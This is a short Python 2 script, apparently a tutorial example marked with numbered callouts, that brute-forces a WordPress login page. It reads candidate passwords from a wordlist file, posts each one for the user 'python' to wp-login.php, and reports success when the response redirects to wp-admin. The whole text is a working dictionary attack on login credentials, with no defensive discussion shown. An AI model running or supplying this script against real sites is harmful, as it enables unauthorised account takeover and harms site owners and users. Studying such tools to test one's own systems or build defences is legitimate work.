import urllib
import urllib2

url = "http://server/wordpress/wp-login.php"                             #(1)
user_login = "python"                                                    #(2)


wordlist = open('wordlist.txt', 'r')                                     #(3)
passwords = wordlist.readlines()
for password in passwords:                                               #(4)
    password = password.strip()

    values = { 'log': user_login, 'pwd': password }

    data     = urllib.urlencode(values)
    request  = urllib2.Request(url, data)
    response = urllib2.urlopen(request)

    try:
        idx = response.geturl().index('wp-admin')                        #(5)
    except:
        idx = 0

    if (idx > 0):                                                        #(6)
        print "################success###########["+password+"]"
        break
    else:
        print "################failed############["+password+"]"
wordlist.close()
